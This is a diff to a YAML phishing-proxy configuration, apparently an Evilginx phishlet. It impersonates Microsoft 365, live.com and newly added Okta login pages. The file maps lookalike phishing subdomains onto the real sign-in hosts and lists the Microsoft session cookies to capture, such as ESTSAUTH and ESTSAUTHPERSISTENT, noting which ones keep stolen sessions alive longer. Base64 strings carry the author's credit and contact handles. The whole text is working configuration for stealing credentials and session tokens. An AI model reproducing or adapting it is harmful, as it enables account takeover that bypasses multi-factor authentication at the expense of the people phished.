@@ -4,10 +4,12 @@ min_ver: '2.3.0'
 proxy_hosts:
   - { phish_sub: "login", orig_sub: "login", domain: "microsoftonline.com", session: true, is_landing: true, auto_filter: false }
   - { phish_sub: "www", orig_sub: "www", domain: "office.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "ms-account", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "live-login", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "live-account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
-  - { phish_sub: "live-outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
+  - { phish_sub: "acc", orig_sub: "account", domain: "microsoft.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "", orig_sub: "", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "okta", orig_sub: "login", domain: "okta.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "live", orig_sub: "login", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "account", orig_sub: "account", domain: "live.com", session: true, is_landing: false, auto_filter: false }
+  - { phish_sub: "outlook", orig_sub: "outlook", domain: "live.com", session: true, is_landing: false }
 
 sub_filters:
   - { triggers_on: "login.microsoftonline.com", orig_sub: "", domain: "", search: 'if(src){return "VGhpcyBwaGlzaGxldCB3YXMgY3JlYXRlZCBieSBANDU2NDc4IC8gQHRvbWthYmVs"}', replace: 'if(src){return "WW91IGNhbiBjb250YWN0IG1lIG9uIFRlbGVncmFtOiBAdG9ta2FiZWwgYW5kIEphYmJlcjogNDU2NDc4QHhtcHAuc2c="}', mimes: ["application/x-javascript"]}
@@ -28,7 +30,7 @@ sub_filters:
 auth_tokens:
   - domain: '.login.microsoftonline.com'
     keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'esctx']
-    # Cookies below aren't strictly necessary, but are used to keep sessions alive (longer).
+    # Cookies below aren't strictly necessary, but are marked as session tokens by MS and may possibly increase the lifespan of cookies.
   - domain: 'login.microsoftonline.com'
     keys: ['ESTSSC', 'ESTSAUTHLIGHT', 'stsservicecookie', 'x-ms-gateway-slice']
 
